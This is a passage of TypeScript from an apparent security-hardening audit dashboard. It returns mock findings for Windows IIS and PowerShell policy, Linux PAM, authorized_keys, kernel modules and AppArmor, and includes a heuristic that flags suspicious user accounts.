        {
          title: 'Features / sites',
          columns: [
            { key: 'name', label: 'name' },
            { key: 'state', label: 'state' },
          ],
          rows: [
            { name: 'IIS-WebServer', state: 'Installed' },
            { name: 'IIS-CGI', state: 'Installed' },
            { name: 'IIS-FTPServer', state: 'Absent' },
            { name: 'Default Web Site', state: 'Started :80, browsing ON' },
          ],
        },
      ],
    }),

  'win.powershell': () =>
    result('PowerShell execution policy is Unrestricted at LocalMachine.', [
      f('crit', 'LocalMachine Unrestricted', 'Any script runs'),
      f('warn', 'Transcription off', 'No script block logging'),
      f('ok', 'MachinePolicy undefined', 'No GPO override'),
    ], {
      tables: [
        {
          title: 'Get-ExecutionPolicy -List',
          columns: [
            { key: 'scope', label: 'scope' },
            { key: 'policy', label: 'policy', mono: true },
          ],
          rows: [
            { scope: 'MachinePolicy', policy: 'Undefined' },
            { scope: 'UserPolicy', policy: 'Undefined' },
            { scope: 'Process', policy: 'Undefined' },
            { scope: 'CurrentUser', policy: 'RemoteSigned' },
            { scope: 'LocalMachine', policy: 'Unrestricted' },
          ],
        },
      ],
    }),

  'linux.pam': () =>
    result('PAM / login.defs: faillock missing, umask 022, minlen 5.', [
      f('crit', 'pam_pwquality minlen=5', 'Bump to 12+'),
      f('crit', 'pam_faillock absent', 'No lockout on tty/ssh'),
      f('warn', 'UMASK 022', 'Prefer 027'),
      f('ok', 'ENCRYPT_METHOD YESCRYPT', 'Good'),
    ], {
      checklist: [
        { id: 'minlen', label: 'pwquality minlen ≥ 12', status: 'fail' },
        { id: 'fail', label: 'pam_faillock configured', status: 'fail' },
        { id: 'umask', label: 'UMASK 027', status: 'fail' },
        { id: 'encrypt', label: 'ENCRYPT_METHOD modern', status: 'pass' },
      ],
    }),

  'linux.authorized-keys': () =>
    result('authorized_keys sweep: 2 unexpected keys.', [
      f('crit', 'root authorized_keys', 'ssh-rsa AAAA…redteam@box'),
      f('warn', 'ubuntu leftover key', 'cloud-init key still present'),
      f('ok', 'cpadmin key', 'Matches team inventory (demo)'),
    ], {
      tables: [
        {
          title: 'Keys',
          columns: [
            { key: 'user', label: 'user', mono: true },
            { key: 'comment', label: 'comment' },
            { key: 'fp', label: 'fingerprint', mono: true },
          ],
          rows: [
            { user: 'root', comment: 'redteam@box', fp: 'SHA256:abc123' },
            { user: 'ubuntu', comment: 'cloud-init', fp: 'SHA256:def456' },
            { user: 'cpadmin', comment: 'team-ed25519', fp: 'SHA256:789aaa' },
          ],
        },
      ],
    }),

  'linux.modules': () =>
    result('Kernel module / unused service sweep.', [
      f('warn', 'usb-storage loaded', 'Consider blacklist on servers'),
      f('warn', 'dccp available', 'Rare protocol — blacklist'),
      f('ok', 'nfsd not loaded', 'Good'),
      f('info', 'Loaded modules', '42 (mock lsmod)'),
    ], {
      checklist: [
        { id: 'usb', label: 'usb-storage blacklisted (if required)', status: 'warn' },
        { id: 'dccp', label: 'dccp/sctp unused protocols off', status: 'fail' },
        { id: 'nfsd', label: 'nfsd not loaded', status: 'pass' },
      ],
    }),

  'linux.mac': () =>
    result('AppArmor is complain-mode; SELinux not installed.', [
      f('warn', 'AppArmor complain', 'aa-status: 12 profiles, 4 in complain'),
      f('info', 'SELinux', 'Not installed (Ubuntu-like image)'),
      f('ok', 'apparmor.service', 'active'),
    ], {
      meta: { mac: 'apparmor', mode: 'complain' },
    }),

  'team.preflight': (ctx) =>
    result(
      `Pre-flight ${ctx.preflightDone}/${ctx.preflightTotal} complete.`,
      [
        f('info', 'Scoreboard-oriented', 'Check README, forensic questions, snapshot, firewall, users.'),
        f(ctx.preflightDone === ctx.preflightTotal ? 'ok' : 'warn', 'Progress', `${ctx.preflightDone} checked`),
      ],
    ),

  'team.journal': (ctx) =>
    result(`Session journal has ${ctx.journalCount} entries.`, [
      f('info', 'Persistence', 'localStorage — survives refresh on this browser.'),
    ]),

  'team.export': () =>
    result('Export bundle ready. Use JSON or CSV in this pane.', [
      f('info', 'Contents', 'Findings from completed panes + journal + user flags.'),
    ]),

  'team.favorites': (ctx) =>
    result(`${ctx.favorites.length} ops pinned.`, [
      f('info', 'Pins', ctx.favorites.length ? ctx.favorites.join(', ') : 'Star ops in the catalog.'),
    ]),
}

function interactiveShellName(shell: string) {
  return ['/bin/bash', '/bin/sh', '/bin/zsh', '/bin/fish'].includes(shell)
}

function reason(u: UserRecord): string {
  const bits: string[] = []
  if (u.uid === 0 && u.name !== 'root') bits.push('UID 0 alias')
  if (u.lastLogin === null && interactiveShellName(u.shell)) bits.push('never logged in')
  if (u.home.startsWith('/tmp') || u.home.includes('l33t')) bits.push('nonstandard home')
  if (u.createdAt.includes('min') || u.createdAt.includes('hour')) bits.push(`recent create (${u.createdAt})`)
  if (u.emptyPassword) bits.push('empty password')
  if (u.hashHint === 'descrypt') bits.push('weak hash')
  if (u.shell.includes('zsh') && !u.authorized) bits.push('unusual shell')
  if (!bits.length) bits.push(u.notes || 'heuristic match')
  return bits.join('; ')
}
